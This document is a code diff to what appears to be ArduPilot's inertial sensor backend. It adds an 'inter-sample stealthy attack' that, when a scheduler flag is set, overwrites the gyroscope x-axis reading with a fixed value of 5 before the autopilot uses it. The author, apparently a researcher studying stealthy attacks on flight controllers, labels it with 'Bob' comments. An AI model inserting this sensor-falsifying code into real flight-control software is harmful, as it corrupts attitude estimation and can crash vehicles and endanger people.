@@ -3,6 +3,9 @@
 #include "AP_InertialSensor_Backend.h"
 #include <AP_Logger/AP_Logger.h>
 #include <AP_BoardConfig/AP_BoardConfig.h>
+
+#include <AP_Scheduler/AP_Scheduler.h> //Bob: for inter-sample stealthy attack
+
 #if AP_MODULE_SUPPORTED
 #include <AP_Module/AP_Module.h>
 #include <stdio.h>
@@ -146,9 +149,19 @@ void AP_InertialSensor_Backend::_publish_gyro(uint8_t instance, const Vector3f &
 
 //Bob: this function is called by the sensor driver.
 void AP_InertialSensor_Backend::_notify_new_gyro_raw_sample(uint8_t instance,
-                                                            const Vector3f &gyro,
+                                                            Vector3f &gyro,
                                                             uint64_t sample_us)
 {
+
+    //Bob: launch inter-sample stealthy attack====================
+    if(_imu.check_inter_sample_atk() && AP_Scheduler::get_singleton()->inter_sample_atk){
+        //gcs().send_text(MAV_SEVERITY_INFO, "Low layer attack launched");
+        (*_imu.fake_gyro_ptr) = gyro;
+        _imu.fake_gyro_ptr->x = 5;
+        gyro = (*_imu.fake_gyro_ptr);
+    }
+    //============================================================
+
     if ((1U<<instance) & _imu.imu_kill_mask) {
         return;
     }
